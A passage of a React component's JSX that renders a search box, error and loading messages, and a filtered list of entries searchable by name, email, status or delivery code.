            <div className="mb-4">
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search by name, email, status, or delivery code..."
                className="w-full rounded-xl border border-slate-200 bg-white px-4 py-3 text-sm outline-none focus:border-orange-400"
              />
            </div>

            {error && (
              <p className="mb-4 rounded-2xl border border-red-200 bg-red-50 p-4 text-sm font-semibold text-red-700">
                {error}
              </p>
            )}

            {loading ? (
              <p className="text-slate-500">Loading entries...</p>
            ) : filtered.length === 0 ? (
              <p className="text-slate-500">{search ? "No matching entries." : "No entries yet."}</p>
            ) : (
              <div className="space-y-3">
                {filtered.map((entry) => (
                  <EntryRow key={entry._id} entry={entry} />
                ))}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
